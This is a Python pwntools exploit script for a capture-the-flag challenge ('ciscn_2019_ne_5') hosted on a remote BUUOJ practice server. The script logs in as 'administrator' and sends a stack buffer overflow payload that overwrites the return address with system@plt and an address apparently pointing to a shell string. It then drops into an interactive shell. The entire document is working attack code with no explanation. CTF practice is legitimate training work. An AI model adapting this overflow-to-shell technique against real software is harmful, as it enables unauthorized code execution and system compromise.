from pwn import *

context.log_level = "debug"

exe = ELF("./ciscn_2019_ne_5")
# r = exe.process()
r = remote("node4.buuoj.cn", 26447)

r.recvuntil(b":")
r.sendline(b"administrator")
r.recvuntil(b":")
r.sendline(b"1")
r.recvuntil(b"info:")
r.sendline(cyclic(0x4C) + p32(exe.plt["system"]) + cyclic(4) + p32(0x80482EA))
r.recvuntil(b":")
r.sendline(b"4")
r.interactive()
